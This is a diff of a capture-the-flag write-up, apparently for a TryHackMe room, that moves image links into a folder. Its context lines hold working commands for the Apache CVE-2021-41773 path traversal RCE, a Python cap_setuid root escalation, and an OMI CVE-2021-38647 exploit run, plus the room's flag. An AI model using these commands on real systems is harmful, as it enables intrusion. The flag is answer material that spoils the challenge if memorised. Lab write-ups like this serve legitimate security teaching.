@@ -41,14 +41,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 As we can see in the scan, the webserver is running `apache 2.4.49`, let's check for an exploit regarding the version. As basic enumeration didn't bring anything useful:
 
 
-![](Pasted%20image%2020250324142059.png)
+![](images/Pasted%20image%2020250324142059.png)
 
 We can find `CVE-2021-41773`, it talks about `path traversal and RCE`, let's take a look at it:
 
 Link: https://www.hackthebox.com/blog/cve-2021-41773-explained
 
 
-![](Pasted%20image%2020250324142413.png)
+![](images/Pasted%20image%2020250324142413.png)
 
 We get `403` status code, but this does not mean we cannot exploit it, let's try a payload test:
 
@@ -60,7 +60,7 @@ We can try that payload test and pass it to the proxy to easily modify the reque
 curl 'http://10.10.240.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; id' --proxy http://127.0.0.1:8080
 ```
 
-![](Pasted%20image%2020250324143146.png)
+![](images/Pasted%20image%2020250324143146.png)
 
 There we go, we got RCE.
 
@@ -81,7 +81,7 @@ curl 'http://10.10.240.39/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/b
 If we send it, we can see our reverse shell:
 
 
-![](Pasted%20image%2020250324143438.png)
+![](images/Pasted%20image%2020250324143438.png)
 
 
 Let's proceed to privilege escalation.
@@ -104,16 +104,16 @@ We can begin by getting our stable shell:
 6. export TERM=xterm
 7. export BASH=bash
 
-![](Pasted%20image%2020250324143608.png)
+![](images/Pasted%20image%2020250324143608.png)
 
 There we go, let's start, first, let's check the `/` directory to check if we're in a docker environment:
 
-![](Pasted%20image%2020250324143717.png)
+![](images/Pasted%20image%2020250324143717.png)
 
 There we go, we are inside of a docker environment, let's check `/etc/hosts`:
 
 
-![](Pasted%20image%2020250324143813.png)
+![](images/Pasted%20image%2020250324143813.png)
 
 We can do some basic enumeration on the docker environment:
 
@@ -134,11 +134,11 @@ We got `python 3.7` with the `cap_setuid` capability, we can exploit this to get
 /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
 ```
 
-![](Pasted%20image%2020250324144612.png)
+![](images/Pasted%20image%2020250324144612.png)
 
 We can find the `user.txt` file inside of the root folder:
 
-![](Pasted%20image%2020250324144801.png)
+![](images/Pasted%20image%2020250324144801.png)
 
 ```
 root@4a70924bafa0:/# cat /root/user.txt
@@ -168,20 +168,20 @@ So, we can scan with the following:
 ./nmap 172.17.0.1 -p- --min-rate 5000 
 ```
 
-![](Pasted%20image%2020250324145632.png)
+![](images/Pasted%20image%2020250324145632.png)
 
 Ports `5985` and `5986` are enabled, since `5985` is closed, we can check for some info regarding the other one:
 
-![](Pasted%20image%2020250324145844.png)
+![](images/Pasted%20image%2020250324145844.png)
 
 We are dealing with OMI, let's search for an exploit:
 
-![](Pasted%20image%2020250324145908.png)
+![](images/Pasted%20image%2020250324145908.png)
 
 
 Let's download the exploit and test the PoC:
 
-![](Pasted%20image%2020250324150038.png)
+![](images/Pasted%20image%2020250324150038.png)
 
 There we go, we got the RCE, with this exploit I couldn't do anything more useful so I tried with this one:
 
@@ -191,7 +191,7 @@ Link: https://github.com/AlteredSecurity/CVE-2021-38647/blob/main/CVE-2021-38647
 python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
 ```
 
-![](Pasted%20image%2020250324150946.png)
+![](images/Pasted%20image%2020250324150946.png)
 
 We got the root flag:
 
@@ -200,6 +200,6 @@ python3 exploit.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"
 THM{7f147ef1f36da9ae29529890a1b6011f}
 ```
 
-![](Pasted%20image%2020250324151021.png)
+![](images/Pasted%20image%2020250324151021.png)
 
 
